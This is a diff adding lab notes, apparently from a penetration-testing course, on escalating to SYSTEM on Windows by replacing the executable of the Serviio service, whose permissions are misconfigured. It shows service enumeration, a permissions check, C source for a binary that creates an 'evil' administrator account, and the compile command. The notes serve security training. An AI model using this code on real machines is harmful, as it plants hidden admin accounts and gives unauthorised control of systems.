@@ -323,5 +323,32 @@ Adjusting this command from "calc.exe" to "cmd.exe" will spawn a cmd.exe shell w
 # 18.2.6 Inescure File Permissions: Servilo Cast Study
 **1.  Log in to your Windows client as an unprivileged user and attempt to elevate your privileges to SYSTEM using the above vulnerability and technique.**
 
+If a service is running as system and the permissions are misconfigured we may be able to replace the program, allowing us to escalate our privileges. To start, lets enumerate the current running services with the following powershell command:
+`Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}`
+![[Pasted image 20220726104103.png]]
+
+We see that Serviio is running from the Program Files directory which means this is a user-installed service. The next step is to investigate the permissions set on the service. We can do this with icacls.
+
+![[Pasted image 20220726104324.png]]
+We can see that the service allows members of the `BUILTIN\Users` group full access, a serious vulnerability. Lets leverage this to elevate our permissions. We start by compiling a malicious binary written in C that will add a user to the administrators group.
+code:
+```C
+#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user evil Ev!lpass /add");
+  i = system ("net localgroup administrators evil /add");
+  
+  return 0;
+}
+```
+compiling:
+`i686-w64-mingw32-gcc adduser.c -o adduser.exe`
+
+
+
 
 **2.  Attempt to get a remote system shell rather than adding a malicious user.**
